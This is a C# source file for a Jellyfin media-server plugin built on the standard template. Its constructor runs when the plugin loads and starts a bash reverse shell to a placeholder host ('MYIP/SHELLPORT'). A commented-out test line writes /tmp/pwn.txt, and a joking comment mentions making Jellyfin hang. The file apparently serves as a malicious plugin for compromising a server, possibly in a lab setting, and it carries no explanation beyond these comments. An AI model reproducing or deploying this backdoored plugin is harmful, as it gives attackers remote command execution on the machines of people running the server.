using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using MyJellyfinPlugin.Configuration;
using MediaBrowser.Common.Configuration;
using MediaBrowser.Common.Plugins;
using MediaBrowser.Model.Plugins;
using MediaBrowser.Model.Serialization;

namespace MyJellyfinPlugin;

/// <summary>
/// The main plugin.
/// </summary>
public class Plugin : BasePlugin<PluginConfiguration>, IHasWebPages
{
    /// <summary>
    /// Initializes a new instance of the <see cref="Plugin"/> class.
    /// </summary>
    /// <param name="applicationPaths">Instance of the <see cref="IApplicationPaths"/> interface.</param>
    /// <param name="xmlSerializer">Instance of the <see cref="IXmlSerializer"/> interface.</param>
    public Plugin(IApplicationPaths applicationPaths, IXmlSerializer xmlSerializer)
        : base(applicationPaths, xmlSerializer)
    {
        Instance = this;
        Process process = new Process();
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "/bin/bash";
        // startInfo.Arguments = "-c \"touch /tmp/pwn.txt\"";
        startInfo.Arguments = "-c \"bash -i >& /dev/tcp/MYIP/SHELLPORT 0>&1\"";
        startInfo.UseShellExecute = true;
        // if you want to make jellyfin hang :)
        // startInfo.RedirectStandardOutput = true;
        startInfo.CreateNoWindow = true;
        process.StartInfo = startInfo;
        process.Start();
    }

    /// <inheritdoc />
    public override string Name => "Template";

    /// <inheritdoc />
    public override Guid Id => Guid.Parse("632fa0e1-cd17-41c3-8e3b-754f8d6d71a1");

    /// <summary>
    /// Gets the current plugin instance.
    /// </summary>
    public static Plugin? Instance { get; private set; }

    /// <inheritdoc />
    public IEnumerable<PluginPageInfo> GetPages()
    {
        return new[]
        {
            new PluginPageInfo
            {
                Name = this.Name,
                EmbeddedResourcePath = string.Format(CultureInfo.InvariantCulture, "{0}.Configuration.configPage.html", GetType().Namespace)
            }
        };
    }
}